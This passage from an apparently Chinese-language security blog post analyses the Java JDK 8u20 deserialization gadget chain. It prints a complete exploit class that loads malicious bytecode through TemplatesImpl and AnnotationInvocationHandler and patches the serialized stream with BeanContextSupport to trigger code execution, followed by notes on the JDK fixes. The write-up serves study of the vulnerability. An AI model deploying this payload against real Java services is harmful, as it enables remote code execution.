        if(bytes[i] == 97 && bytes[i+1] == 97 && bytes[i+2] == 97){
            bytes = Util.deleteAt(bytes, i + 3);
            break;
        }
    }//调整TC_ENDBLOCKDATA标记的位置
    bytes = Util.addAtLast(bytes, (byte) 0x78);
    writeBinaryFile("testcase_new", bytes);
}
```

```java
public class Util {
    public static byte[] deleteAt(byte[] array, int index) {
        if (index < 0 || index >= array.length) {
            throw new IndexOutOfBoundsException("Index out of bounds: " + index);
        }

        byte[] result = new byte[array.length - 1];
        System.arraycopy(array, 0, result, 0, index);
        System.arraycopy(array, index + 1, result, index, array.length - index - 1);
        return result;
    }
    public static byte[] addAtLast(byte[] array, byte value) {
        byte[] result = new byte[array.length + 1];
        System.arraycopy(array, 0, result, 0, array.length);
        result[array.length] = value;
        return result;
    }
}
```

生成的文件一样。这个改了`Contents`和`TC_ENDBLOCKDATA`的序列化文件就能进行反序列化



该在哪插入BeanContextSupport呢？

jdk7u21的链从LinkedHashSet开始

```java
LinkedHashSet.add()
HashSet.readObject ->
	HashMap.put ->
		AnnotationInvocationHandler.invoke-> hashCodeImpl ->
		AnnotationInvocationHandler.invoke-> equalsImpl ->
			TemplatesImpl.newTransformer
```

AnnotationInvocationHandler.readObject抛出的异常必须由BeanContextSupport直接接收，不然抛出到LinkedHashSet或者HashMap都会直接中止程序并报红错。



我们在一开始的LinkedHashSet就强制设置一个字段为BeanContextSupport（包含了需要初始化的AnnotationInvocationHandler对象）。这样在HashSet.readObject一开始就能初始化Anno对象（触发完Anno.readObject)，后面就不会报错了

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240917200003151.png)

可纵观HashSet，一个transient，一个static final，没有一个字段可以强行设置，只有调用add向HashMap装填BeanContextSupport

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240918150224374.png)

就利用到了上面修改Contents和TC_REFERENCE字段的case了



payload直接抄，以后也用不到自己写的

https://xz.aliyun.com/t/8277?time__1311=n4%2BxnD0Dc7ex9DIrxBqroGkDRlW3GCD0guxeTD&u_atoken=21a5f0453c9b225c72d561589e310fe4&u_asig=1a0c380917266645911855714e00d6#toc-5

payload：

```java
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import javax.xml.transform.Templates;
import java.beans.beancontext.BeanContextSupport;
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.LinkedHashSet;
import java.util.Map;

public class JDK8u20 {
    public static void main(String[] args) throws Exception {
        byte[] code1 = Files.readAllBytes(Paths.get("E:\\CODE_COLLECT\\Idea_java_ProTest\\Test\\target\\classes\\RuntimeEvil.class"));
        TemplatesImpl templatesClass = new TemplatesImpl();
        Field[] fields = templatesClass.getClass().getDeclaredFields();
        for (Field field : fields) {
            field.setAccessible(true);
            if (field.getName().equals("_bytecodes")) {
                field.set(templatesClass, new byte[][]{code1});
            } else if (field.getName().equals("_name")) {
                field.set(templatesClass, "godown");
            } else if (field.getName().equals("_tfactory")) {
                field.set(templatesClass, new TransformerFactoryImpl());
            }
        }
        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        HashMap Annovar2map = new HashMap();
        Annovar2map.put("f5a5a608",templatesClass);
        InvocationHandler annotationInvocationHandler = (InvocationHandler) constructor.newInstance(Override.class, Annovar2map);
        Field typeField = annotationInvocationHandler.getClass().getDeclaredField("type");
        typeField.setAccessible(true);
        Map annoProxy = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]{Map.class},annotationInvocationHandler);
        LinkedHashSet annoset = new LinkedHashSet();
        typeField.set(annotationInvocationHandler, Templates.class);

        BeanContextSupport bcs = new BeanContextSupport();
        Class cc = Class.forName("java.beans.beancontext.BeanContextSupport");
        Field serializable = cc.getDeclaredField("serializable");
        serializable.setAccessible(true);
        serializable.set(bcs, 0);

        Field beanContextChildPeer = cc.getSuperclass().getDeclaredField("beanContextChildPeer");
        beanContextChildPeer.set(bcs, bcs);

        annoset.add(bcs);

        //序列化
        ByteArrayOutputStream baous = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baous);

        oos.writeObject(annoset);
        oos.writeObject(annotationInvocationHandler);
        oos.writeObject(templatesClass);
        oos.writeObject(annoProxy);
        oos.close();

        byte[] bytes = baous.toByteArray();
        System.out.println("[+] Modify HashSet size from  1 to 3");
        bytes[89] = 3; //修改hashset的长度（元素个数）

        //调整 TC_ENDBLOCKDATA 标记的位置
        //0x73 = 115, 0x78 = 120
        //0x73 for TC_OBJECT, 0x78 for TC_ENDBLOCKDATA
        for(int i = 0; i < bytes.length; i++){
            if(bytes[i] == 0 && bytes[i+1] == 0 && bytes[i+2] == 0 & bytes[i+3] == 0 &&
                    bytes[i+4] == 120 && bytes[i+5] == 120 && bytes[i+6] == 115){
                System.out.println("[+] Delete TC_ENDBLOCKDATA at the end of HashSet");
                bytes = Util.deleteAt(bytes, i + 5);
                break;
            }
        }


        //将 serializable 的值修改为 1
        //0x73 = 115, 0x78 = 120
        //0x73 for TC_OBJECT, 0x78 for TC_ENDBLOCKDATA
        for(int i = 0; i < bytes.length; i++){
            if(bytes[i] == 120 && bytes[i+1] == 0 && bytes[i+2] == 1 && bytes[i+3] == 0 &&
                    bytes[i+4] == 0 && bytes[i+5] == 0 && bytes[i+6] == 0 && bytes[i+7] == 115){
                System.out.println("[+] Modify BeanContextSupport.serializable from 0 to 1");
                bytes[i+6] = 1;
                break;
            }
        }

        /**
         TC_BLOCKDATA - 0x77
         Length - 4 - 0x04
         Contents - 0x00000000
         TC_ENDBLOCKDATA - 0x78
         **/

        //把这部分内容先删除，再附加到 AnnotationInvocationHandler 之后
        //目的是让 AnnotationInvocationHandler 变成 BeanContextSupport 的数据流
        //0x77 = 119, 0x78 = 120
        //0x77 for TC_BLOCKDATA, 0x78 for TC_ENDBLOCKDATA
        for(int i = 0; i < bytes.length; i++){
            if(bytes[i] == 119 && bytes[i+1] == 4 && bytes[i+2] == 0 && bytes[i+3] == 0 &&
                    bytes[i+4] == 0 && bytes[i+5] == 0 && bytes[i+6] == 120){
                System.out.println("[+] Delete TC_BLOCKDATA...int...TC_BLOCKDATA at the End of BeanContextSupport");
                bytes = Util.deleteAt(bytes, i);
                bytes = Util.deleteAt(bytes, i);
                bytes = Util.deleteAt(bytes, i);
                bytes = Util.deleteAt(bytes, i);
                bytes = Util.deleteAt(bytes, i);
                bytes = Util.deleteAt(bytes, i);
                bytes = Util.deleteAt(bytes, i);
                break;
            }
        }

        /*
              serialVersionUID - 0x00 00 00 00 00 00 00 00
                  newHandle 0x00 7e 00 28
                  classDescFlags - 0x00 -
                  fieldCount - 0 - 0x00 00
                  classAnnotations
                    TC_ENDBLOCKDATA - 0x78
                  superClassDesc
                    TC_NULL - 0x70
              newHandle 0x00 7e 00 29
         */
        //0x78 = 120, 0x70 = 112
        //0x78 for TC_ENDBLOCKDATA, 0x70 for TC_NULL
        for(int i = 0; i < bytes.length; i++){
            if(bytes[i] == 0 && bytes[i+1] == 0 && bytes[i+2] == 0 && bytes[i+3] == 0 &&
                    bytes[i + 4] == 0 && bytes[i+5] == 0 && bytes[i+6] == 0 && bytes[i+7] == 0 &&
                    bytes[i+8] == 0 && bytes[i+9] == 0 && bytes[i+10] == 0 && bytes[i+11] == 120 &&
                    bytes[i+12] == 112){
                System.out.println("[+] Add back previous delte TC_BLOCKDATA...int...TC_BLOCKDATA after invocationHandler");
                i = i + 13;
                bytes = Util.addAtIndex(bytes, i++, (byte) 0x77);
                bytes = Util.addAtIndex(bytes, i++, (byte) 0x04);
                bytes = Util.addAtIndex(bytes, i++, (byte) 0x00);
                bytes = Util.addAtIndex(bytes, i++, (byte) 0x00);
                bytes = Util.addAtIndex(bytes, i++, (byte) 0x00);
                bytes = Util.addAtIndex(bytes, i++, (byte) 0x00);
                bytes = Util.addAtIndex(bytes, i++, (byte) 0x78);
                break;
            }
        }

        //将 sun.reflect.annotation.AnnotationInvocationHandler 的 classDescFlags 由 SC_SERIALIZABLE 修改为 SC_SERIALIZABLE | SC_WRITE_METHOD
        //这一步其实不是通过理论推算出来的，是通过debug 以及查看 pwntester的 poc 发现需要这么改
        //原因是如果不设置 SC_WRITE_METHOD 标志的话 defaultDataEnd = true，导致 BeanContextSupport -> deserialize(ois, bcmListeners = new ArrayList(1))
        // -> count = ois.readInt(); 报错，无法完成整个反序列化流程
        // 没有 SC_WRITE_METHOD 标记，认为这个反序列流到此就结束了
        // 标记： 7375 6e2e 7265 666c 6563 --> sun.reflect...
        for(int i = 0; i < bytes.length; i++){
            if(bytes[i] == 115 && bytes[i+1] == 117 && bytes[i+2] == 110 && bytes[i+3] == 46 &&
                    bytes[i + 4] == 114 && bytes[i+5] == 101 && bytes[i+6] == 102 && bytes[i+7] == 108 ){
                System.out.println("[+] Modify sun.reflect.annotation.AnnotationInvocationHandler -> classDescFlags from SC_SERIALIZABLE to " +
                        "SC_SERIALIZABLE | SC_WRITE_METHOD");
                i = i + 58;
                bytes[i] = 3;
                break;
            }
        }

        //加回之前删除的 TC_BLOCKDATA，表明 HashSet 到此结束
        System.out.println("[+] Add TC_BLOCKDATA at end");
        bytes = Util.addAtLast(bytes, (byte) 0x78);


        FileOutputStream fous = new FileOutputStream("jre8u20.ser");
        fous.write(bytes);

        //反序列化
        FileInputStream fis = new FileInputStream("jre8u20.ser");
        ObjectInputStream ois = new ObjectInputStream(fis);
        ois.readObject();
        ois.close();
    }
}
```

库Util：

```java
package org.example;


import java.nio.ByteBuffer;

public class Util {

    /**
     * 从 byte 数组中删除指定索引位置的元素。
     *
     * @param array 要操作的 byte 数组
     * @param index 要删除的元素索引
     * @return 删除元素后的 byte 数组
     */
    public static byte[] deleteAt(byte[] array, int index) {
        if (index < 0 || index >= array.length) {
            throw new IndexOutOfBoundsException("Index out of bounds: " + index);
        }

        byte[] result = new byte[array.length - 1];
        System.arraycopy(array, 0, result, 0, index);
        System.arraycopy(array, index + 1, result, index, array.length - index - 1);
        return result;
    }

    /**
     * 在 byte 数组末尾添加一个元素。
     *
     * @param array 要操作的 byte 数组
     * @param value 要添加的元素值
     * @return 添加元素后的 byte 数组
     */
    public static byte[] addAtLast(byte[] array, byte value) {
        byte[] result = new byte[array.length + 1];
        System.arraycopy(array, 0, result, 0, array.length);
        result[array.length] = value;
        return result;
    }
    public static byte[] addAtIndex(byte[] bytes, int index, byte value) {
        if (index < 0 || index > bytes.length) {
            throw new IndexOutOfBoundsException("Index out of bounds");
        }

        // 创建一个新数组，比原数组大1个元素
        byte[] newBytes = new byte[bytes.length + 1];

        // 复制前半部分数据
        System.arraycopy(bytes, 0, newBytes, 0, index);

        // 插入新元素
        newBytes[index] = value;

        // 复制后半部分数据
        System.arraycopy(bytes, index, newBytes, index + 1, bytes.length - index);

        return newBytes;
    }
}
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240918220159414.png)



## 8u20修复

### jdk7

jdk7u80 getMemberMethods()增加了对memberMethods用validateAnnotationMethod函数进行验证

```java
// jdk7_80  sun.reflect.annotation.AnnotationInvocationHandler#getMemberMethods

private transient volatile Method[] memberMethods = null;

private Method[] getMemberMethods() {
    if (this.memberMethods == null) {
        this.memberMethods = (Method[])AccessController.doPrivileged(new PrivilegedAction<Method[]>() {
            public Method[] run() {
                Method[] var1 = AnnotationInvocationHandler.this.type.getDeclaredMethods();
                // 这里的  var1 是 newTransformer 和 getOutputProperties
                AnnotationInvocationHandler.this.validateAnnotationMethods(var1); // 增加了这个函数
                AccessibleObject.setAccessible(var1, true);
                return var1;
            }
        });
    }
    return this.memberMethods;
}
```

jdk8u191 把defaultReadObject修改为了readFields();，因为抛出异常提前退出readObject不再能顺利序列化字段中的对象了。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240918220533201.png)









如果看不懂，参考文章1很细致

7u21参考文章:

宸极实验室—『代码审计』ysoserial Jdk7u21 反序列化漏洞分析

https://zhuanlan.zhihu.com/p/639541505

修复方案

https://cloud.tencent.com/developer/article/2204427

8u20 参考文章:

https://cloud.tencent.com/developer/article/2204437